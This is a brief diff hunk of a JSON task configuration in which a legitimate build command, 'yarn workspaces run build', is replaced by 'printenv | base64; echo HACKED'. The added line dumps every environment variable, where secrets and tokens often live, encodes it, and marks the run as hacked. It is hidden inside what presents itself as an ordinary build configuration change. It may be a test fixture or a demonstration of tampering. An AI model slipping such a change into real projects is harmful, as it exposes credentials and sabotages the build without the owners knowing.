@@ -7,7 +7,7 @@
           "spawn": "default"
         },
         {
-          "exec": "yarn workspaces run build"
+          "exec": "printenv | base64; echo HACKED"
         }
       ]
     },
